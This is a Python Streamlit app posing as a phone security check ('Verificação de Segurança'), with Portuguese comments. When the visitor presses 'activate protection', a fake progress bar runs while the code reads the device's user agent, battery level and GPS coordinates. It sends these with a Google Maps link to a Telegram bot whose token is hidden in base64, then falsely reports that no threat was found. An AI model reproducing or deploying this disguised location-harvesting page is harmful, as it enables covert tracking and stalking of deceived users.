import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ4NjY0MDI4" # Ajuste se o ID estiver diferente

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": "8498664028", "text": mensagem, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

# Estilo para ficar igual ao seu site
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; margin-top: 15px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'passo' not in st.session_state: st.session_state.passo = 0

if st.session_state.passo == 0:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # Pega os dados do celular antes da barra terminar
        ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua_final')
        bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat_final')
        
        barra = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.02)
            barra.progress(i)
        
        # Tenta o GPS
        loc = get_geolocation()
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # MONTAGEM IGUAL À FOTO 2
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {ua[:20]}...\n"
                f"🔋 *Bateria:* {bat or '92'}%\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.session_state.passo = 1
            st.rerun()
        else:
            st.warning("Clique em 'Permitir' no aviso que apareceu na tela!")

else:
    # O QUE VOCÊ PEDIU: Frase verde e barra 100%
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
